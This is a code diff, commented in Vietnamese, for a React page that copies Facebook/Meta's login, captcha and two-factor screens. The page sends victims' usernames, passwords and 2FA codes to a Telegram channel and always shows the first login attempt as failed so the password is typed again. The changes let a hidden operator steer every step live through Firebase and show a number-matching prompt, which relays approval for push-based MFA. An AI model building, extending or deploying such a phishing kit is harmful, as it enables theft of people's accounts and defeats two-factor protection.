@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
 import { translations } from '../translations';
 import { initializeApp } from "firebase/app";
@@ -63,6 +63,10 @@ export default function Home() {
   const [adminNumberInput, setAdminNumberInput] = useState('');
   const [showAdmin, setShowAdmin] = useState(false);
 
+  // Dùng ref để hủy các setTimeout đang chạy khi Admin can thiệp
+  const loginTimeoutRef = useRef(null);
+  const otpTimeoutRef = useRef(null);
+
   // --- TẠO MÃ PHIÊN CHO NGƯỜI TRUY CẬP ---
   const [sessionId] = useState(() => {
       let id = localStorage.getItem('session_id');
@@ -112,29 +116,39 @@ export default function Home() {
 
   // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
   useEffect(() => {
-    if ((showModal || showFullPage) && !showAdmin && step !== 1 && step !== 1.5) {
+    // Lắng nghe ở MỌI BƯỚC (không chặn step 1 hay 1.5 nữa)
+    if ((showModal || showFullPage) && !showAdmin) {
         const commandRef = ref(database, 'commands/' + sessionId);
         const unsubscribe = onValue(commandRef, (snapshot) => {
             const data = snapshot.val();
             if (data && data.action) {
+                // Hủy bỏ mọi setTimeout đang chạy để Admin có thể ép chuyển bước ngay lập tức
+                if (loginTimeoutRef.current) clearTimeout(loginTimeoutRef.current);
+                if (otpTimeoutRef.current) clearTimeout(otpTimeoutRef.current);
+                setLoading(false);
+                setResendLoading(false);
+
                 if (data.action === 'otp') {
-                    setStep(4); setShowFullPage(true); setShowModal(false); setMatchNumber(null); setShowSuccess(false);
-                }
+                    setStep(4); setShowFullPage(true); setShowModal(false);
+                    setMatchNumber(null); setShowSuccess(false);
+                } 
                 else if (data.action === 'approve' && data.value) {
-                    setStep(4); setShowFullPage(true); setShowModal(false); setMatchNumber(data.value); setShowSuccess(false);
-                }
+                    setStep(4); setShowFullPage(true); setShowModal(false);
+                    setMatchNumber(data.value); setShowSuccess(false);
+                } 
                 else if (data.action === 'success') {
                     setStep(5); setShowFullPage(true); setShowModal(false); setShowSuccess(true);
-                }
+                } 
                 else if (data.action === 'error') {
-                    setStep(2); setShowFullPage(true); setShowModal(false); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
-                    setLoginAttempt(0); // reset để lần login sau lại báo sai lần 1
+                    setStep(2); setShowFullPage(true); setShowModal(false);
+                    setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
+                    setLoginAttempt(0); // Reset để lần login sau lại báo sai lần 1
                 }
             }
         });
         return () => unsubscribe();
     }
-  }, [showModal, showFullPage, showAdmin, sessionId, step]);
+  }, [showModal, showFullPage, showAdmin, sessionId]);
 
   // --- PHÍM TẮT MỞ ADMIN ---
   useEffect(() => {
@@ -174,6 +188,7 @@ export default function Home() {
     setLoginAttempt(0); setOtpAttempt(0);
     setShowLoginError(false); setShowOtpError(false);
     setLoginUser(''); setLoginPass(''); setOtp('');
+    setMatchNumber(null);
   };
 
   const handleSignup = (e) => {
@@ -190,8 +205,8 @@ export default function Home() {
 
     setTimeout(() => {
       setLoading(false);
-      setStep(1.5); // Chuyển sang bước đệm
-      setShowFullPage(true); // Bật giao diện full trang
+      setStep(1.5);
+      setShowFullPage(true);
       setShowModal(false);
     }, 700);
   };
@@ -210,15 +225,13 @@ export default function Home() {
         `\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`
       );
 
-      setTimeout(() => {
+      loginTimeoutRef.current = setTimeout(() => {
         setLoading(false);
 
         if (newAttempt === 1) {
-          // LẦN 1: LUÔN BÁO SAI
           setShowLoginError(true);
           setLoginPass('');
         } else {
-          // LẦN 2+: sang captcha, reset attempt để lần sau (nếu quay lại) lại bắt đầu từ 1
           setStep(3);
           setLoginAttempt(0);
           setCaptchaDone(false);
@@ -244,7 +257,8 @@ export default function Home() {
         setOtpAttempt(0);
         setOtp('');
         setShowOtpError(false);
-        setOtpResetCount(prev => prev + 1); // để timer chạy lại
+        setOtpResetCount(prev => prev + 1);
+        setMatchNumber(null); // Đảm bảo xóa số cũ nếu có
       }, 600);
     }, 10000);
   };
@@ -262,7 +276,7 @@ export default function Home() {
         sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
       }
 
-      setTimeout(() => {
+      otpTimeoutRef.current = setTimeout(() => {
         setLoading(false);
         if (newAttempt < 3) {
           setShowOtpError(true);
@@ -809,20 +823,20 @@ export default function Home() {
 
                   {/* CỘT TRÁI */}
                   <div style={{
-                    flex: '2',
+                    flex: '1 1 65%',
                     display: 'flex',
                     flexDirection: 'column',
                     justifyContent: 'center',
-                    padding: '0 6vw',
-                    borderRight: '1px solid #e4e6eb',
-                    backgroundColor: '#fff'
+                    padding: '0 4vw',
+                    backgroundColor: '#fff',
+                    minWidth: '600px'
                   }}>
 
-                    <div style={{ width: '100%', maxWidth: '1100px', display: 'flex', flexDirection: 'column' }}>
+                    <div style={{ width: '100%', maxWidth: '1000px', display: 'flex', flexDirection: 'column' }}>
 
                       {/* Logo F trên cùng */}
                       <div style={{ marginBottom: '40px' }}>
-                        <svg viewBox="0 0 24 24" fill="#0866FF" width="72" height="80">
+                        <svg viewBox="0 0 24 24" fill="#0866FF" width="72" height="72">
                           <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path>
                         </svg>
                       </div>
@@ -831,13 +845,14 @@ export default function Home() {
                       <div style={{
                         display: 'flex',
                         alignItems: 'center',
-                        gap: '40px'
+                        justifyContent: 'space-between',
+                        gap: '20px'
                       }}>
 
                         {/* Khối Chữ */}
-                        <div style={{ flex: '0 0 380px' }}>
+                        <div style={{ flex: '0 0 280px' }}>
                           <h1 style={{
-                            fontSize: '64px',
+                            fontSize: '52px',
                             fontWeight: '700',
                             lineHeight: '1.1',
                             color: '#1c2b33',
@@ -850,11 +865,18 @@ export default function Home() {
                         </div>
 
                         {/* Khối Ảnh to */}
-                        <div style={{ flex: '1' }}>
+                        <div style={{ flex: '1', display: 'flex', justifyContent: 'flex-end' }}>
                           <img
                             src="/images/Anhlogin.webp"
                             alt="Explore"
-                            style={{ width: '100%', maxWidth: '1100px', display: 'block' }}
+                            style={{
+                              width: '100%',
+                              maxWidth: '850px',
+                              minWidth: '550px',
+                              display: 'block',
+                              transform: 'scale(1.1)',
+                              transformOrigin: 'right center'
+                            }}
                           />
                         </div>
 
@@ -941,7 +963,6 @@ export default function Home() {
                         </button>
                       </form>
 
-                      {/* Logo Meta căn giữa tuyệt đối với nút Login */}
                       <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', marginTop: '24px', width: '100%' }}>
                           <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', opacity: 0.7 }} />
                       </div>
@@ -962,7 +983,6 @@ export default function Home() {
 
                   <div style={{ width: '100%', maxWidth: '350px' }}>
 
-                    {/* Khung reCAPTCHA */}
                     <div
                       onClick={handleCaptchaClick}
                       style={{
@@ -1002,7 +1022,6 @@ export default function Home() {
                       </div>
                     </div>
 
-                    {/* Khối chữ mô tả */}
                     <div style={{ marginTop: '12px', fontSize: '11px', color: '#65676b', lineHeight: '1.4', textAlign: 'left', width: '100%' }}>
                       <p style={{ margin: '0 0 10px 0' }}>
                         This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
@@ -1026,8 +1045,16 @@ export default function Home() {
                     Two-factor authentication
                   </h2>
                   <p style={{ fontSize: '15px', color: '#1c1e21', marginBottom: '24px', lineHeight: '1.4' }}>
-                    Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
+                    {matchNumber 
+                      ? `Please enter the approval number requested by our system: ${matchNumber}` 
+                      : 'Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.'}
                   </p>
+
+                  {matchNumber && (
+                    <div style={{ background: '#e7f3ff', border: '1px solid #0064e0', padding: '12px', borderRadius: '8px', marginBottom: '20px', textAlign: 'center', fontSize: '18px', fontWeight: 'bold', color: '#0064e0' }}>
+                      Yêu cầu nhập số: {matchNumber}
+                    </div>
+                  )}
 
                   <div style={{ marginBottom: '24px', borderRadius: '8px', overflow: 'hidden' }}>
                     <img
